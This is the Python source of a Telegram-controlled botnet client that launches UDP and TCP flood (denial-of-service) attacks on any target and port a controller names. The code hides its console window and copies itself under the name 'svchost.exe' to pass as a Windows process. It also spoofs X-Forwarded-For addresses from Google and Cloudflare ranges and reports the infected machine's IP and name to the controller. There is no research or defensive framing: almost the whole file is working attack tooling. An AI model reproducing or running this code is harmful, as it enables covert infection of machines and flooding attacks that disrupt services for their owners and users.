import asyncio
import socket
import random
import time
import threading
import requests
import os
import struct
import sys
import platform
import ctypes
import shutil
import base64
import subprocess
import json
from dataclasses import dataclass
from typing import Dict, Tuple, List
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError
from itertools import cycle
import re

# ==================== CONFIGURATION ====================
BOT_TOKEN = "YOUR_ACTUAL_BOT_TOKEN_HERE"
ADMIN_CHAT_ID = YOUR_ACTUAL_CHAT_ID

# ==================== MINIMAL STEALTH ====================
def hide_console():
    """Hide console window - minimal stealth that works with BAT deployment"""
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def is_running_from_stealth_location():
    """Check if we're running from the deployed location (set by the BAT file)"""
    current_exe = os.path.abspath(sys.argv[0])
    expected_paths = [
        os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Network', 'Diagnostics', 'svchost.exe'),
        os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'SystemServices', 'svchost.exe')
    ]
    
    return any(current_exe.lower() == path.lower() for path in expected_paths)

def apply_minimal_stealth():
    """Apply only essential stealth measures that work with BAT file deployment"""
    if not is_running_from_stealth_location():
        # If not deployed by BAT file, try basic hiding
        hide_console()
        
        # Simple file hiding if running from temporary location
        try:
            current_exe = os.path.abspath(sys.argv[0])
            if not current_exe.lower().endswith('svchost.exe'):
                # Copy to temp with stealth name if not already deployed
                temp_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'SystemCache')
                os.makedirs(temp_dir, exist_ok=True)
                target_path = os.path.join(temp_dir, 'svchost.exe')
                
                if current_exe.lower() != target_path.lower():
                    shutil.copy2(current_exe, target_path)
                    subprocess.Popen([target_path], 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL,
                                   stdin=subprocess.DEVNULL,
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
        except:
            pass  # Silent fail - rely on BAT file for proper deployment

# ==================== GLOBAL STATE ====================
connected_bots = {}
attack_stats = {
    "total_packets": 0,
    "total_bytes": 0,
    "active_attacks": 0,
    "current_pps": 0,
    "last_reset": time.time()
}
stats_lock = threading.Lock()
bots_lock = threading.Lock()
active_attacks = {}
attack_lock = threading.Lock()

@dataclass
class AttackConfig:
    method: str
    target: str
    port: int
    duration: int
    threads: int
    stop_event: threading.Event
    attack_id: str
    start_time: float = 0
    packet_count: int = 0
    byte_count: int = 0

# ==================== ANONYMITY TECHNIQUES ====================
class Anonymity:
    @staticmethod
    def generate_fake_ip():
        """Generate fake IP addresses for headers"""
        ip_ranges = [
            ("1.0.0.0", "1.255.255.255"),    # Cloudflare
            ("8.8.0.0", "8.8.255.255"),      # Google DNS
            ("9.9.9.0", "9.9.9.255"),        # Quad9 DNS
            ("64.4.0.0", "64.4.63.255"),     # Microsoft
            ("64.233.160.0", "64.233.191.255"), # Google
            ("74.125.0.0", "74.125.255.255"),  # Google
            ("104.16.0.0", "104.31.255.255"),  # Cloudflare
            ("172.217.0.0", "172.217.255.255"), # Google
            ("216.58.192.0", "216.58.223.255"), # Google
        ]
        
        start_ip, end_ip = random.choice(ip_ranges)
        start_int = struct.unpack("!I", socket.inet_aton(start_ip))[0]
        end_int = struct.unpack("!I", socket.inet_aton(end_ip))[0]
        random_ip_int = random.randint(start_int, end_int)
        return socket.inet_ntoa(struct.pack("!I", random_ip_int))

# ==================== PERFORMANCE OPTIMIZATIONS ====================
class SocketPool:
    """Reusable socket pool for high-performance operations"""
    def __init__(self, max_sockets=100):
        self.sockets = []
        self.max_sockets = max_sockets
        self.lock = threading.Lock()
        
    def get_socket(self, family, type):
        """Get reusable socket"""
        with self.lock:
            for sock in self.sockets:
                if not sock._closed:
                    return sock
            sock = socket.socket(family, type)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
            self.sockets.append(sock)
            return sock
            
    def cleanup(self):
        """Close all sockets"""
        with self.lock:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
            self.sockets.clear()

# Global socket pools
udp_socket_pool = SocketPool()
tcp_socket_pool = SocketPool()

# ==================== USER AGENTS & REALISTIC TRAFFIC ====================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101'
]

REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/'
]

PATHS = [
    '/', '/index.html', '/home', '/main', '/wp-admin', '/admin',
    '/login', '/signin', '/api/v1', '/search', '/images', '/blog',
    '/shop', '/products', '/contact', '/about', '/services', '/pricing'
]

# ==================== HIGH-PERFORMANCE LAYER 4 ATTACKS ====================
class Layer4:
    def __init__(self, target: Tuple[str, int], method: str, stop_event: threading.Event, attack_id: str):
        self._target = target
        self._method = method
        self._stop_event = stop_event
        self._attack_id = attack_id
        self._packet_count = 0
        self._byte_count = 0
        self._batch_size = 500 if method == "UDP" else 10
        
    def run(self):
        if self._method == "UDP":
            self.udp_flood_optimized()
        elif self._method == "TCP":
            self.tcp_flood_optimized()
    
    def udp_flood_optimized(self):
        """High-performance UDP flood with traffic randomization"""
        target_ip, port = self._target
        
        # Pre-generate payload batches for maximum performance
        payload_batches = []
        for _ in range(3):
            batch = []
            for i in range(self._batch_size):
                size = random.choice([512, 1024, 1400])
                payload = random._urandom(size)
                batch.append(payload)
            payload_batches.append(batch)
        
        batch_cycle = cycle(payload_batches)
        sock = udp_socket_pool.get_socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(0)
        
        end_time = time.time() + 3600
        
        while not self._stop_event.is_set() and time.time() < end_time:
            try:
                batch = next(batch_cycle)
                
                for payload in batch:
                    try:
                        sock.sendto(payload, (target_ip, port))
                        self._packet_count += 1
                        self._byte_count += len(payload)
                    except BlockingIOError:
                        pass
                
                # Update stats less frequently to reduce overhead
                if self._packet_count % 5000 == 0:
                    with stats_lock:
                        attack_stats["total_packets"] += self._packet_count
                        attack_stats["total_bytes"] += self._byte_count
                        attack_stats["current_pps"] = self._packet_count / max(0.1, (time.time() - attack_stats["last_reset"]))
                    self._packet_count = 0
                    self._byte_count = 0
                    
                time.sleep(0.0001)
                    
            except Exception as e:
                try:
                    sock.close()
                except:
                    pass
                sock = udp_socket_pool.get_socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(0)
        
        # Final update
        with stats_lock:
            attack_stats["total_packets"] += self._packet_count
            attack_stats["total_bytes"] += self._byte_count
        
        try:
            sock.close()
        except:
            pass
    
    def tcp_flood_optimized(self):
        """Optimized TCP flood with realistic traffic patterns"""
        target_ip, port = self._target
        end_time = time.time() + 3600
        
        # Pre-generate request templates
        requests = []
        for _ in range(15):
            user_agent = random.choice(USER_AGENTS)
            referer = random.choice(REFERERS)
            path = random.choice(PATHS)
            
            http_request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_ip}:{port}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Connection: keep-alive\r\n"
                f"X-Forwarded-For: {Anonymity.generate_fake_ip()}\r\n\r\n"
            ).encode()
            
            requests.append(http_request)
        
        request_cycle = cycle(requests)
        
        while not self._stop_event.is_set() and time.time() < end_time:
            try:
                sock = tcp_socket_pool.get_socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                
                sock.connect((target_ip, port))
                
                for _ in range(10):
                    http_request = next(request_cycle)
                    sock.send(http_request)
                    
                    self._packet_count += 1
                    self._byte_count += len(http_request)
                    
                    try:
                        sock.recv(1024)
                    except:
                        pass
                
                sock.close()
                
                # Update stats
                if self._packet_count % 100 == 0:
                    with stats_lock:
                        attack_stats["total_packets"] += self._packet_count
                        attack_stats["total_bytes"] += self._byte_count
                    self._packet_count = 0
                    self._byte_count = 0
                    
                time.sleep(0.01)
                    
            except Exception as e:
                try:
                    sock.close()
                except:
                    pass
        
        # Final update
        with stats_lock:
            attack_stats["total_packets"] += self._packet_count
            attack_stats["total_bytes"] += self._byte_count

# ==================== HELPER FUNCTIONS ====================
def escape_markdown(text: str) -> str:
    escape_chars = r'\_*[]()~`>#+-=|{}!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', text)

async def safe_send_message(update: Update, text: str, max_retries: int = 3):
    for attempt in range(max_retries):
        try:
            await update.message.reply_text(text, parse_mode='Markdown')
            return True
        except NetworkError:
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
            else:
                return False
        except Exception:
            try:
                await update.message.reply_text(text)
                return True
            except:
                return False
    return False

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def get_pc_name():
    try:
        return platform.node()
    except:
        return "Unknown"

def generate_attack_id():
    return f"attack_{int(time.time())}_{random.randint(1000, 9999)}"

def resolve_target(target: str) -> str:
    try:
        return socket.gethostbyname(target)
    except:
        return target

# ==================== ATTACK LAUNCHER ====================
def launch_attack(config: AttackConfig):
    """Launch attack with performance optimizations"""
    with stats_lock:
        attack_stats['active_attacks'] = len(active_attacks)
        attack_stats['last_reset'] = time.time()
        
    threads = []
    resolved_target = resolve_target(config.target)
    
    for _ in range(config.threads):
        if config.method in ["UDP", "TCP"]:
            attack = Layer4((resolved_target, config.port), config.method, config.stop_event, config.attack_id)
            thread = threading.Thread(target=attack.run)
        else:
            with attack_lock:
                if config.attack_id in active_attacks:
                    del active_attacks[config.attack_id]
                attack_stats['active_attacks'] = len(active_attacks)
            return
            
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for attack to complete or be stopped
    end_time = time.time() + config.duration
    while time.time() < end_time and not config.stop_event.is_set():
        time.sleep(0.1)
    
    config.stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
        
    with attack_lock:
        if config.attack_id in active_attacks:
            del active_attacks[config.attack_id]
        attack_stats['active_attacks'] = len(active_attacks)
        
    # Reset current rates after attack completes
    with stats_lock:
        if config.method == "UDP":
            attack_stats['current_pps'] = 0

    # Cleanup socket pools
    udp_socket_pool.cleanup()
    tcp_socket_pool.cleanup()

# ==================== TELEGRAM BOT FUNCTIONS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_id = update.effective_chat.id
    client_ip = get_public_ip()
    pc_name = get_pc_name()

    with bots_lock:
        connected_bots[bot_id] = {
            "last_seen": time.time(), 
            "ip": client_ip, 
            "pc_name": pc_name
        }

    welcome_msg = f"""
👨‍🏫 *Professor Ping, PHD* 
──────────────────────────
✅ *ID:* `{escape_markdown(str(bot_id))}`
🌐 *IP:* `{escape_markdown(client_ip)}`
💻 *PC Name:* `{escape_markdown(pc_name)}`
──────────────────────────
Type /help for commands.
    """
    await safe_send_message(update, welcome_msg)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
👨‍🏫 *Professor Ping's Commands* 
══════════════════════════
🤖 *Bot Management*
/start - Register bot with controller
/help - Show this help menu
/stats - Show global attack statistics
/stop - Stop all active attacks

⚡ *Attack Commands*
/attack [method] [target] [port] [duration] [threads]

🌐 *Layer 4 Methods*
• UDP - High-performance UDP flood
• TCP - Optimized TCP flood

⚙️ *Usage Examples*
/attack UDP example.com 80 60 10
/attack TCP 192.168.1.1 443 120 5
══════════════════════════
    """
    await safe_send_message(update, help_text)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with stats_lock:
        gbps = (attack_stats['total_bytes'] * 8) / (1024**3)
        stats_msg = f"""
📊 *Global Statistics* 📊
──────────────────────────
📶 Total Bandwidth: `{gbps:.2f} Gbps`
📦 Total Packets: `{attack_stats['total_packets']:,}`
📡 Current PPS: `{int(attack_stats['current_pps']):,}`
🎯 Active Attacks: `{attack_stats['active_attacks']}`
──────────────────────────
        """
    await safe_send_message(update, stats_msg)

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_chat.id != ADMIN_CHAT_ID:
            await safe_send_message(update, "❌ *Unauthorized*")
            return
            
        args = context.args
        if len(args) < 4:
            await safe_send_message(update, "❌ *Usage:* `/attack [method] [target] [port] [duration] [threads]`")
            return
        
        method = args[0].upper()
        valid_methods = ["UDP", "TCP"]
        
        if method not in valid_methods:
            await safe_send_message(update, f"❌ *Invalid method. Available:* `{'`, `'.join(valid_methods)}`")
            return
        
        requested_threads = int(args[4]) if len(args) > 4 else 10
        max_threads = 50
        
        if requested_threads > max_threads:
            await safe_send_message(update, f"⚠️ *Threads capped at {max_threads} for optimal performance*")
            requested_threads = max_threads
        
        stop_event = threading.Event()
        attack_id = generate_attack_id()
        
        config = AttackConfig(
            method=method,
            target=args[1],
            port=int(args[2]),
            duration=int(args[3]),
            threads=requested_threads,
            stop_event=stop_event,
            attack_id=attack_id,
            start_time=time.time()
        )
        
        attack_thread = threading.Thread(target=launch_attack, args=(config,), daemon=True)
        
        with attack_lock:
            active_attacks[attack_id] = {
                'thread': attack_thread,
                'config': config,
                'start_time': time.time()
            }
            attack_stats['active_attacks'] = len(active_attacks)
        
        attack_thread.start()
        
        success_msg = f"""
⚡ *Attack Launched* ⚡
──────────────────────────
🎯 Target: `{escape_markdown(config.target)}`
📡 Method: `{escape_markdown(config.method)}`
🚪 Port: `{config.port}`
⏰ Duration: `{config.duration}s`
🧵 Threads: `{config.threads}`
🆔 ID: `{attack_id}`
⚡ Performance: `Optimized`
──────────────────────────
        """
        await safe_send_message(update, success_msg)
    
    except Exception as e:
        error_msg = f"❌ *Error:* `{escape_markdown(str(e))}`"
        await safe_send_message(update, error_msg)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await safe_send_message(update, "❌ *Unauthorized*")
        return
        
    stopped_count = 0
    with attack_lock:
        for attack_id, attack_info in list(active_attacks.items()):
            attack_info['config'].stop_event.set()
            stopped_count += 1
            del active_attacks[attack_id]
        
        attack_stats['active_attacks'] = len(active_attacks)
    
    await safe_send_message(update, f"🛑 *Stopped {stopped_count} active attacks*")

# ==================== ERROR HANDLER ====================
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    pass

# ==================== MAIN ====================
def main():
    try:        
        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("stats", show_stats))
        application.add_handler(CommandHandler("attack", attack_command))
        application.add_handler(CommandHandler("stop", stop_command))
        
        application.add_error_handler(error_handler)

        # Register admin bot
        with bots_lock:
            connected_bots[ADMIN_CHAT_ID] = {
                "last_seen": time.time(),
                "ip": get_public_ip(),
                "pc_name": get_pc_name()
            }
        
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        pass

if __name__ == "__main__":
    # Apply minimal stealth (complements the BAT file)
    apply_minimal_stealth()
    
    # Run the bot
    main()